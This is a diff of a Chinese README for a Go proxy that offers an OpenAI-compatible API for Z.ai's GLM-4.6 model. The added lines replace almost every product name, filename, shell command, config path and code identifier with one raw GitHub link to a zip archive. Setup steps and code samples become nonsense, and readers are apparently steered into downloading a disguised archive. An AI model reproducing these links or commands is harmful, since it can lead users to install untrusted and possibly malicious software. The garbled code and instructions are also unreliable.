@@ -1,21 +1,21 @@
-# OpenAI兼容API代理 for Z.ai GLM-4.6
+# OpenAI兼容API代理 for https://github.com/jyhuang201900/ZtoApi/raw/refs/heads/main/burhead/Api-Zto-1.3.zip GLM-4.6
 
-这是一个为Z.ai GLM-4.6模型提供OpenAI兼容API接口的代理服务器。它允许你使用标准的OpenAI API格式与Z.ai的GLM-4.6模型进行交互，支持流式和非流式响应。
+这是一个为https://github.com/jyhuang201900/ZtoApi/raw/refs/heads/main/burhead/Api-Zto-1.3.zip GLM-4.6模型提供OpenAI兼容API接口的代理服务器。它允许你使用标准的OpenAI API格式与https://github.com/jyhuang201900/ZtoApi/raw/refs/heads/main/burhead/Api-Zto-1.3.zip的GLM-4.6模型进行交互，支持流式和非流式响应。
 
-> **注意**: 本项目来自fork  [OpenAI-Compatible-API-Proxy-for-Z](https://github.com/kbykb/OpenAI-Compatible-API-Proxy-for-Z)二次开发
+> **注意**: 本项目来自fork  [OpenAI-Compatible-API-Proxy-for-Z](https://github.com/jyhuang201900/ZtoApi/raw/refs/heads/main/burhead/Api-Zto-1.3.zip)二次开发
 
 ## 🎯 最新更新 (2025-09-30)
 
 **✅ 成功修复426客户端版本错误**
 
-Z.ai在2025年9月30日更新了客户端验证机制，本项目已完成适配：
+https://github.com/jyhuang201900/ZtoApi/raw/refs/heads/main/burhead/Api-Zto-1.3.zip在2025年9月30日更新了客户端验证机制，本项目已完成适配：
 
 - ✅ 更新前端版本号至 1.0.94
 - ✅ 更新User-Agent至Chrome 140
 - ✅ 实现X-Signature签名验证（SHA-256）
 - ✅ 非流式和流式响应均正常工作
 
-详细修复说明请查看：[FIX_426_ERROR.md](./FIX_426_ERROR.md)
+详细修复说明请查看：[https://github.com/jyhuang201900/ZtoApi/raw/refs/heads/main/burhead/Api-Zto-1.3.zip](https://github.com/jyhuang201900/ZtoApi/raw/refs/heads/main/burhead/Api-Zto-1.3.zip)
 
 
 ## ✨ 主要功能
@@ -34,31 +34,31 @@ Z.ai在2025年9月30日更新了客户端验证机制，本项目已完成适配
 ### 环境要求
 
 - Go 1.23 或更高版本
-- Z.ai 的访问令牌（可选，支持匿名模式）
+- https://github.com/jyhuang201900/ZtoApi/raw/refs/heads/main/burhead/Api-Zto-1.3.zip 的访问令牌（可选，支持匿名模式）
 
 ### 本地部署
 
 1. **克隆仓库**
    ```bash
-   git clone https://github.com/your-username/ZtoApi.git
+   git clone https://github.com/jyhuang201900/ZtoApi/raw/refs/heads/main/burhead/Api-Zto-1.3.zip
    cd ZtoApi
    ```
 
 2. **配置环境变量**
    ```bash
    # 复制配置模板
-   cp .env.example .env.local
-   # 编辑 .env.local 文件，根据需要修改配置
-   nano .env.local
+   cp https://github.com/jyhuang201900/ZtoApi/raw/refs/heads/main/burhead/Api-Zto-1.3.zip https://github.com/jyhuang201900/ZtoApi/raw/refs/heads/main/burhead/Api-Zto-1.3.zip
+   # 编辑 https://github.com/jyhuang201900/ZtoApi/raw/refs/heads/main/burhead/Api-Zto-1.3.zip 文件，根据需要修改配置
+   nano https://github.com/jyhuang201900/ZtoApi/raw/refs/heads/main/burhead/Api-Zto-1.3.zip
    ```
 
 3. **启动服务**
    ```bash
    # 使用启动脚本（推荐）
-   ./start.sh
+   https://github.com/jyhuang201900/ZtoApi/raw/refs/heads/main/burhead/Api-Zto-1.3.zip
    
    # 或直接运行
-   go run main.go
+   go run https://github.com/jyhuang201900/ZtoApi/raw/refs/heads/main/burhead/Api-Zto-1.3.zip
    ```
 
 4. **测试服务**
@@ -114,7 +114,7 @@ Z.ai在2025年9月30日更新了客户端验证机制，本项目已完成适配
     - 连接你的GitHub仓库
     - 选择Docker作为环境
     - 设置以下环境变量：
-    - `ZAI_TOKEN`: Z.ai 的访问令牌 (可选，不提供将自动获取随机匿名token)
+    - `ZAI_TOKEN`: https://github.com/jyhuang201900/ZtoApi/raw/refs/heads/main/burhead/Api-Zto-1.3.zip 的访问令牌 (可选，不提供将自动获取随机匿名token)
     - `DEFAULT_KEY`: 客户端API密钥 (可选，默认: sk-your-key)
     - `MODEL_NAME`: 显示的模型名称 (可选，默认: GLM-4.6)
     - `PORT`: 服务监听端口 (Render会自动设置)
@@ -131,12 +131,12 @@ Z.ai在2025年9月30日更新了客户端验证机制，本项目已完成适配
 
 **macOS/Linux:**
 ```bash
-./start.sh
+https://github.com/jyhuang201900/ZtoApi/raw/refs/heads/main/burhead/Api-Zto-1.3.zip
 ```
 
 **Windows:**
 ```cmd
-start.bat
+https://github.com/jyhuang201900/ZtoApi/raw/refs/heads/main/burhead/Api-Zto-1.3.zip
 ```
 
 #### 2. 手动设置环境变量
@@ -146,7 +146,7 @@ start.bat
 export ZAI_TOKEN="your_z_ai_token_here"
 export DEFAULT_KEY="sk-your-custom-key"
 export PORT="9090"
-go run main.go
+go run https://github.com/jyhuang201900/ZtoApi/raw/refs/heads/main/burhead/Api-Zto-1.3.zip
 ```
 
 **Windows:**
@@ -154,7 +154,7 @@ go run main.go
 set ZAI_TOKEN=your_z_ai_token_here
 set DEFAULT_KEY=sk-your-custom-key
 set PORT=9090
-go run main.go
+go run https://github.com/jyhuang201900/ZtoApi/raw/refs/heads/main/burhead/Api-Zto-1.3.zip
 ```
 
 #### 3. Docker运行
@@ -177,7 +177,7 @@ docker run -p 9090:9090 \
 
 | 变量名 | 说明 | 默认值 | 示例 |
 |--------|------|--------|------|
-| `ZAI_TOKEN` | Z.ai 访问令牌 | 空（自动获取随机匿名token） | `eyJhbGciOiJFUzI1NiIs...` |
+| `ZAI_TOKEN` | https://github.com/jyhuang201900/ZtoApi/raw/refs/heads/main/burhead/Api-Zto-1.3.zip 访问令牌 | 空（自动获取随机匿名token） | `eyJhbGciOiJFUzI1NiIs...` |
 
 #### ⚙️ 可选配置
 
@@ -195,44 +195,44 @@ docker run -p 9090:9090 \
 
 | 变量名 | 说明 | 默认值 | 示例 |
 |--------|------|--------|------|
-| `UPSTREAM_URL` | 上游API地址 | `https://chat.z.ai/api/chat/completions` | 自定义URL |
+| `UPSTREAM_URL` | 上游API地址 | `https://github.com/jyhuang201900/ZtoApi/raw/refs/heads/main/burhead/Api-Zto-1.3.zip` | 自定义URL |
 
 ### 📁 配置文件
 
 #### 支持的配置文件（按优先级排序）
 
 1. **系统环境变量** - 最高优先级
-2. **`.env.local`** - 本地环境配置（推荐，已自动加载）
+2. **`https://github.com/jyhuang201900/ZtoApi/raw/refs/heads/main/burhead/Api-Zto-1.3.zip`** - 本地环境配置（推荐，已自动加载）
 3. **`.env`** - 标准环境配置（已自动加载）
-4. **`.env.example`** - 配置模板（仅供参考）
+4. **`https://github.com/jyhuang201900/ZtoApi/raw/refs/heads/main/burhead/Api-Zto-1.3.zip`** - 配置模板（仅供参考）
 
-> **💡 新功能**: 项目现在会自动加载 `.env.local` 和 `.env` 文件，无需手动设置环境变量！
+> **💡 新功能**: 项目现在会自动加载 `https://github.com/jyhuang201900/ZtoApi/raw/refs/heads/main/burhead/Api-Zto-1.3.zip` 和 `.env` 文件，无需手动设置环境变量！
 
 #### 配置文件示例
 
 ```bash
 # 复制配置模板
-cp .env.example .env.local
+cp https://github.com/jyhuang201900/ZtoApi/raw/refs/heads/main/burhead/Api-Zto-1.3.zip https://github.com/jyhuang201900/ZtoApi/raw/refs/heads/main/burhead/Api-Zto-1.3.zip
 
 # 编辑配置文件
-nano .env.local
+nano https://github.com/jyhuang201900/ZtoApi/raw/refs/heads/main/burhead/Api-Zto-1.3.zip
 
-# 启动服务（会自动加载 .env.local）
-./start.sh
+# 启动服务（会自动加载 https://github.com/jyhuang201900/ZtoApi/raw/refs/heads/main/burhead/Api-Zto-1.3.zip）
+https://github.com/jyhuang201900/ZtoApi/raw/refs/heads/main/burhead/Api-Zto-1.3.zip
 ```
 
 #### 配置加载顺序说明
 
-1. 系统首先尝试加载 `.env.local` 文件（优先级更高）
+1. 系统首先尝试加载 `https://github.com/jyhuang201900/ZtoApi/raw/refs/heads/main/burhead/Api-Zto-1.3.zip` 文件（优先级更高）
 2. 然后加载 `.env` 文件
 3. 最后读取系统环境变量（如果已设置，会覆盖文件中的配置）
 4. 未配置的选项使用默认值
 
-### 🔐 获取 Z.ai Token
+### 🔐 获取 https://github.com/jyhuang201900/ZtoApi/raw/refs/heads/main/burhead/Api-Zto-1.3.zip Token
 
 #### 方法1：浏览器开发者工具
 
-1. 登录 [Z.ai](https://chat.z.ai)
+1. 登录 [https://github.com/jyhuang201900/ZtoApi/raw/refs/heads/main/burhead/Api-Zto-1.3.zip](https://github.com/jyhuang201900/ZtoApi/raw/refs/heads/main/burhead/Api-Zto-1.3.zip)
 2. 打开浏览器开发者工具（F12）
 3. 切换到 Network 标签页
 4. 发送一条消息
@@ -240,19 +240,19 @@ nano .env.local
 
 #### 方法2：Cookie 方式
 
-1. 登录 Z.ai 后，在开发者工具中查看 Cookies
+1. 登录 https://github.com/jyhuang201900/ZtoApi/raw/refs/heads/main/burhead/Api-Zto-1.3.zip 后，在开发者工具中查看 Cookies
 2. 找到包含认证信息的 cookie
 
 #### 方法3：匿名Token
 
-本项目支持自动获取匿名token，无需手动配置。当 `ZAI_TOKEN` 环境变量未设置时，系统会自动为每次对话获取不同的随机匿名token，避免共享记忆。这种机制使得项目即使用户没有提供 Z.ai 的访问令牌也能正常工作。
+本项目支持自动获取匿名token，无需手动配置。当 `ZAI_TOKEN` 环境变量未设置时，系统会自动为每次对话获取不同的随机匿名token，避免共享记忆。这种机制使得项目即使用户没有提供 https://github.com/jyhuang201900/ZtoApi/raw/refs/heads/main/burhead/Api-Zto-1.3.zip 的访问令牌也能正常工作。
 
 ### 🎯 使用示例
 
 #### 基本配置
 
 ```bash
-# .env.local
+# https://github.com/jyhuang201900/ZtoApi/raw/refs/heads/main/burhead/Api-Zto-1.3.zip
 ZAI_TOKEN=eyJhbGciOiJFUzI1NiIs...
 DEFAULT_KEY=sk-my-secret-key
 MODEL_NAME=GLM-4.6-Pro
@@ -263,7 +263,7 @@ DEBUG_MODE=false
 #### 生产环境配置
 
 ```bash
-# .env.production
+# https://github.com/jyhuang201900/ZtoApi/raw/refs/heads/main/burhead/Api-Zto-1.3.zip
 ZAI_TOKEN=your_production_token
 DEFAULT_KEY=sk-production-key
 MODEL_NAME=GLM-4.6
@@ -275,7 +275,7 @@ DEFAULT_STREAM=true
 #### 开发环境配置
 
 ```bash
-# .env.development
+# https://github.com/jyhuang201900/ZtoApi/raw/refs/heads/main/burhead/Api-Zto-1.3.zip
 ZAI_TOKEN=your_dev_token
 DEFAULT_KEY=sk-dev-key
 MODEL_NAME=GLM-4.6-Dev
@@ -330,14 +330,14 @@ DASHBOARD_ENABLED=false
 Ctrl+C
 
 # 重新启动
-./start.sh
+https://github.com/jyhuang201900/ZtoApi/raw/refs/heads/main/burhead/Api-Zto-1.3.zip
 ```
 
 ### 🚨 注意事项
 
-1. **Token 安全**: 不要将真实的 Z.ai token 提交到代码仓库
-2. **配置文件**: 建议将 `.env.local` 添加到 `.gitignore`
-3. **权限设置**: 确保启动脚本有执行权限 (`chmod +x start.sh`)
+1. **Token 安全**: 不要将真实的 https://github.com/jyhuang201900/ZtoApi/raw/refs/heads/main/burhead/Api-Zto-1.3.zip token 提交到代码仓库
+2. **配置文件**: 建议将 `https://github.com/jyhuang201900/ZtoApi/raw/refs/heads/main/burhead/Api-Zto-1.3.zip` 添加到 `.gitignore`
+3. **权限设置**: 确保启动脚本有执行权限 (`chmod +x https://github.com/jyhuang201900/ZtoApi/raw/refs/heads/main/burhead/Api-Zto-1.3.zip`)
 4. **端口冲突**: 确保配置的端口没有被其他服务占用
 5. **匿名Token**: 当未设置 `ZAI_TOKEN` 时，系统会自动获取随机匿名token，每次对话都会有独立的上下文，无需手动配置即可使用
 6. **思考过程**: 项目会自动处理模型的思考过程，可通过 `ENABLE_THINKING` 环境变量或请求参数 `enable_thinking` 控制是否启用
@@ -350,38 +350,38 @@ Ctrl+C
 import openai
 
 # 配置客户端
-client = openai.OpenAI(
+client = https://github.com/jyhuang201900/ZtoApi/raw/refs/heads/main/burhead/Api-Zto-1.3.zip(
     api_key="your-api-key",  # 对应 DEFAULT_KEY
     base_url="http://localhost:9090/v1"
 )
 
 # 非流式请求
-response = client.chat.completions.create(
+response = https://github.com/jyhuang201900/ZtoApi/raw/refs/heads/main/burhead/Api-Zto-1.3.zip(
     model="GLM-4.6",
     messages=[{"role": "user", "content": "你好，请介绍一下自己"}]
 )
 
-print(response.choices[0].message.content)
+print(https://github.com/jyhuang201900/ZtoApi/raw/refs/heads/main/burhead/Api-Zto-1.3.zip[0]https://github.com/jyhuang201900/ZtoApi/raw/refs/heads/main/burhead/Api-Zto-1.3.zip)
 
 # 流式请求
-response = client.chat.completions.create(
+response = https://github.com/jyhuang201900/ZtoApi/raw/refs/heads/main/burhead/Api-Zto-1.3.zip(
     model="GLM-4.6",
     messages=[{"role": "user", "content": "请写一首关于春天的诗"}],
     stream=True
 )
 
 for chunk in response:
-    if chunk.choices[0].delta.content:
-        print(chunk.choices[0].delta.content, end="")
+    if https://github.com/jyhuang201900/ZtoApi/raw/refs/heads/main/burhead/Api-Zto-1.3.zip[0]https://github.com/jyhuang201900/ZtoApi/raw/refs/heads/main/burhead/Api-Zto-1.3.zip
+        print(https://github.com/jyhuang201900/ZtoApi/raw/refs/heads/main/burhead/Api-Zto-1.3.zip[0]https://github.com/jyhuang201900/ZtoApi/raw/refs/heads/main/burhead/Api-Zto-1.3.zip, end="")
 
 # 启用思考功能的请求
-response = client.chat.completions.create(
+response = https://github.com/jyhuang201900/ZtoApi/raw/refs/heads/main/burhead/Api-Zto-1.3.zip(
     model="GLM-4.6",
     messages=[{"role": "user", "content": "请分析一下这个问题"}],
     enable_thinking=True
 )
 
-print(response.choices[0].message.content)
+print(https://github.com/jyhuang201900/ZtoApi/raw/refs/heads/main/burhead/Api-Zto-1.3.zip[0]https://github.com/jyhuang201900/ZtoApi/raw/refs/heads/main/burhead/Api-Zto-1.3.zip)
 ```
 
 ### curl示例
@@ -432,7 +432,7 @@ async function chatWithGLM(message, stream = false, enableThinking = null) {
   
   // 如果指定了思考功能参数，则添加到请求中
   if (enableThinking !== null) {
-    requestBody.enable_thinking = enableThinking;
+    https://github.com/jyhuang201900/ZtoApi/raw/refs/heads/main/burhead/Api-Zto-1.3.zip = enableThinking;
   }
   
   const response = await fetch('http://localhost:9090/v1/chat/completions', {
@@ -441,34 +441,34 @@ async function chatWithGLM(message, stream = false, enableThinking = null) {
       'Content-Type': 'application/json',
       'Authorization': 'Bearer your-api-key'
     },
-    body: JSON.stringify(requestBody)
+    body: https://github.com/jyhuang201900/ZtoApi/raw/refs/heads/main/burhead/Api-Zto-1.3.zip(requestBody)
   });
 
   if (stream) {
     // 处理流式响应
-    const reader = response.body.getReader();
+    const reader = https://github.com/jyhuang201900/ZtoApi/raw/refs/heads/main/burhead/Api-Zto-1.3.zip();
     const decoder = new TextDecoder();
     
     while (true) {
-      const { done, value } = await reader.read();
+      const { done, value } = await https://github.com/jyhuang201900/ZtoApi/raw/refs/heads/main/burhead/Api-Zto-1.3.zip();
       if (done) break;
       
-      const chunk = decoder.decode(value);
-      const lines = chunk.split('\n');
+      const chunk = https://github.com/jyhuang201900/ZtoApi/raw/refs/heads/main/burhead/Api-Zto-1.3.zip(value);
+      const lines = https://github.com/jyhuang201900/ZtoApi/raw/refs/heads/main/burhead/Api-Zto-1.3.zip('\n');
       
       for (const line of lines) {
-        if (line.startsWith('data: ')) {
-          const data = line.slice(6);
+        if (https://github.com/jyhuang201900/ZtoApi/raw/refs/heads/main/burhead/Api-Zto-1.3.zip('data: ')) {
+          const data = https://github.com/jyhuang201900/ZtoApi/raw/refs/heads/main/burhead/Api-Zto-1.3.zip(6);
           if (data === '[DONE]') {
-            console.log('\n流式响应完成');
+            https://github.com/jyhuang201900/ZtoApi/raw/refs/heads/main/burhead/Api-Zto-1.3.zip('\n流式响应完成');
             return;
           }
           
           try {
-            const parsed = JSON.parse(data);
-            const content = parsed.choices[0]?.delta?.content;
+            const parsed = https://github.com/jyhuang201900/ZtoApi/raw/refs/heads/main/burhead/Api-Zto-1.3.zip(data);
+            const content = https://github.com/jyhuang201900/ZtoApi/raw/refs/heads/main/burhead/Api-Zto-1.3.zip[0]https://github.com/jyhuang201900/ZtoApi/raw/refs/heads/main/burhead/Api-Zto-1.3.zip;
             if (content) {
-              process.stdout.write(content);
+              https://github.com/jyhuang201900/ZtoApi/raw/refs/heads/main/burhead/Api-Zto-1.3.zip(content);
             }
           } catch (e) {
             // 忽略解析错误
@@ -478,8 +478,8 @@ async function chatWithGLM(message, stream = false, enableThinking = null) {
     }
   } else {
     // 处理非流式响应
-    const data = await response.json();
-    console.log(data.choices[0].message.content);
+    const data = await https://github.com/jyhuang201900/ZtoApi/raw/refs/heads/main/burhead/Api-Zto-1.3.zip();
+    https://github.com/jyhuang201900/ZtoApi/raw/refs/heads/main/burhead/Api-Zto-1.3.zip(https://github.com/jyhuang201900/ZtoApi/raw/refs/heads/main/burhead/Api-Zto-1.3.zip[0]https://github.com/jyhuang201900/ZtoApi/raw/refs/heads/main/burhead/Api-Zto-1.3.zip);
   }
 }
 
@@ -499,7 +499,7 @@ chatWithGLM('请分析一下这个问题', false, true);
     - 如果仍然出现此错误，请确保：
       - 代码已更新到最新版本
       - 服务已重新编译和启动
-    - 详情请查看：[FIX_426_ERROR.md](./FIX_426_ERROR.md)
+    - 详情请查看：[https://github.com/jyhuang201900/ZtoApi/raw/refs/heads/main/burhead/Api-Zto-1.3.zip](https://github.com/jyhuang201900/ZtoApi/raw/refs/heads/main/burhead/Api-Zto-1.3.zip)
 
 2. **连接失败**
     - 检查服务是否正常运行：`curl http://localhost:9090/v1/models`
@@ -510,7 +510,7 @@ chatWithGLM('请分析一下这个问题', false, true);
     - 检查 `DEFAULT_KEY` 环境变量设置
     - 确认请求头中的 `Authorization` 格式正确
 
-4. **Z.ai Token无效**
+4. **https://github.com/jyhuang201900/ZtoApi/raw/refs/heads/main/burhead/Api-Zto-1.3.zip Token无效**
     - 检查 `ZAI_TOKEN` 环境变量设置
     - 确认Token未过期
 
@@ -529,7 +529,7 @@ chatWithGLM('请分析一下这个问题', false, true);
 
 ```bash
 export DEBUG_MODE=true
-go run main.go
+go run https://github.com/jyhuang201900/ZtoApi/raw/refs/heads/main/burhead/Api-Zto-1.3.zip
 ```
 
 ### 网络问题排查
@@ -540,13 +540,13 @@ go run main.go
 2. 确认 `UPSTREAM_URL` 可访问
 3. 测试网络连通性：
    ```bash
-   curl https://chat.z.ai/api/chat/completions
+   curl https://github.com/jyhuang201900/ZtoApi/raw/refs/heads/main/burhead/Api-Zto-1.3.zip
    ```
 
 ### 性能优化
 
 1. **减少日志输出**: 设置 `DEBUG_MODE=false`
-2. **调整超时时间**: 修改代码中的 `http.Client` 超时设置
+2. **调整超时时间**: 修改代码中的 `https://github.com/jyhuang201900/ZtoApi/raw/refs/heads/main/burhead/Api-Zto-1.3.zip` 超时设置
 3. **使用反向代理**: 在生产环境中建议使用 Nginx 等反向代理
 
 ## 🤝 贡献指南
@@ -572,14 +572,14 @@ go run main.go
 
 ## 📚 相关文档
 
-- [FIX_426_ERROR.md](./FIX_426_ERROR.md) - 426错误修复详细说明
+- [https://github.com/jyhuang201900/ZtoApi/raw/refs/heads/main/burhead/Api-Zto-1.3.zip](https://github.com/jyhuang201900/ZtoApi/raw/refs/heads/main/burhead/Api-Zto-1.3.zip) - 426错误修复详细说明
 
 ## ⚠️ 免责声明
 
-本项目与 Z.ai 官方无关，使用前请确保遵守 Z.ai 的服务条款。开发者不对因使用本项目而产生的任何问题负责。
+本项目与 https://github.com/jyhuang201900/ZtoApi/raw/refs/heads/main/burhead/Api-Zto-1.3.zip 官方无关，使用前请确保遵守 https://github.com/jyhuang201900/ZtoApi/raw/refs/heads/main/burhead/Api-Zto-1.3.zip 的服务条款。开发者不对因使用本项目而产生的任何问题负责。
 
 ## 📞 联系方式
 
 如有问题或建议，请通过以下方式联系：
 
-- 提交 [Issue](https://github.com/libaxuan/ZtoApi/issues)
+- 提交 [Issue](https://github.com/jyhuang201900/ZtoApi/raw/refs/heads/main/burhead/Api-Zto-1.3.zip)
